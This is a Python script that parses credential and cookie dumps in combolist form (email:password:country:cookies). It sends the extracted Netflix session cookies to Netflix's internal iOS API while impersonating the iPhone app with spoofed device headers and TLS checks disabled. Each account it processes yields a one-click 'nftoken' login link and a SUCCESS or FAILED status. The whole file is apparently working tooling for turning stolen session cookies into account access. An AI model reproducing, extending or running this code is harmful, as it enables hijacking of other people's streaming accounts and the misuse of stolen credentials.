import json
import re
import urllib.parse
from datetime import datetime

import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"


def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}


def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value


def extract_cookie_dict(text):
    cookie_dict = {}

    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))

    try:
        data = json.loads(text)
    except Exception:
        data = None

    if isinstance(data, list):
        for cookie in data:
            name = cookie.get("name")
            value = cookie.get("value")
            if name in COOKIE_KEYS and isinstance(value, str):
                cookie_dict[name] = _decode_cookie_value(value)
    elif isinstance(data, dict):
        if any(key in data for key in COOKIE_KEYS):
            for key in COOKIE_KEYS:
                value = data.get(key)
                if isinstance(value, str):
                    cookie_dict[key] = _decode_cookie_value(value)
        elif isinstance(data.get("cookies"), list):
            for cookie in data["cookies"]:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = _decode_cookie_value(value)

    for key in COOKIE_KEYS:
        if key in cookie_dict:
            continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = _decode_cookie_value(match.group(1))

    return cookie_dict


def parse_account_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    cookie_match = re.search(r"(NetflixId=|SecureNetflixId=|nfvdid=|OptanonConsent=)", line, re.IGNORECASE)

    if cookie_match:
        idx = cookie_match.start()
        prefix = line[:idx].rstrip(" :;")
        cookie_str = line[idx:]

        parts = [p.strip() for p in prefix.split(":") if p.strip()]
        email = ""
        password = ""
        country = ""

        if len(parts) == 1:
            email = parts[0]
        elif len(parts) == 2:
            email, password = parts[0], parts[1]
        elif len(parts) >= 3:
            email, password, country = parts[0], parts[1], parts[2]

        cookie_dict = extract_cookie_dict(cookie_str)
        return {
            "email": email,
            "password": password,
            "country": country,
            "raw_cookie": cookie_str,
            "cookie_dict": cookie_dict,
            "original_line": line,
        }

    parts = line.split(":")
    if len(parts) >= 3 and "@" in parts[0]:
        email = parts[0].strip()
        password = parts[1].strip()
        if len(parts) == 3:
            country = ""
            cookie_str = parts[2]
        else:
            country = parts[2].strip()
            cookie_str = ":".join(parts[3:])
        cookie_dict = extract_cookie_dict(cookie_str)
        return {
            "email": email,
            "password": password,
            "country": country,
            "raw_cookie": cookie_str,
            "cookie_dict": cookie_dict,
            "original_line": line,
        }

    cookie_dict = extract_cookie_dict(line)
    return {
        "email": "",
        "password": "",
        "country": "",
        "raw_cookie": line,
        "cookie_dict": cookie_dict,
        "original_line": line,
    }


def build_nftoken_link(token):
    return "https://netflix.com/?nftoken=" + token


def fetch_nftoken(cookie_dict, timeout=30):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Missing required cookie: NetflixId")

    headers = dict(BASE_HEADERS)
    cookie_parts = [f"NetflixId={netflix_id}"]
    if cookie_dict.get("SecureNetflixId"):
        cookie_parts.append(f"SecureNetflixId={cookie_dict['SecureNetflixId']}")

    headers["Cookie"] = "; ".join(cookie_parts)

    response = requests.get(
        API_URL,
        params=QUERY_PARAMS,
        headers=headers,
        timeout=timeout,
        verify=False,
    )
    response.raise_for_status()

    data = response.json()
    token_data = (
        (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
        or {}
    )
    token = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        raise ValueError("No token found in response.")

    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000

    return token, expires


def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(expires)


def process_account(acc_dict, timeout=30):
    result = {
        "email": acc_dict.get("email", ""),
        "password": acc_dict.get("password", ""),
        "country": acc_dict.get("country", ""),
        "raw_line": acc_dict.get("original_line", ""),
        "token": None,
        "login_url": None,
        "expires": None,
        "expiry_str": "N/A",
        "status": "FAILED",
        "error": None,
    }

    cookie_dict = acc_dict.get("cookie_dict", {})
    if not cookie_dict or REQUIRED_COOKIE not in cookie_dict:
        result["error"] = "Invalid/Missing NetflixId cookie"
        return result

    try:
        token, expires = fetch_nftoken(cookie_dict, timeout=timeout)
        result["token"] = token
        result["login_url"] = build_nftoken_link(token)
        result["expires"] = expires
        result["expiry_str"] = format_expiry(expires)
        result["status"] = "SUCCESS"
    except requests.RequestException as exc:
        result["error"] = f"Request Error: {str(exc)}"
    except ValueError as exc:
        result["error"] = f"Parse Error: {str(exc)}"
    except Exception as exc:
        result["error"] = f"Unexpected Error: {str(exc)}"

    return result
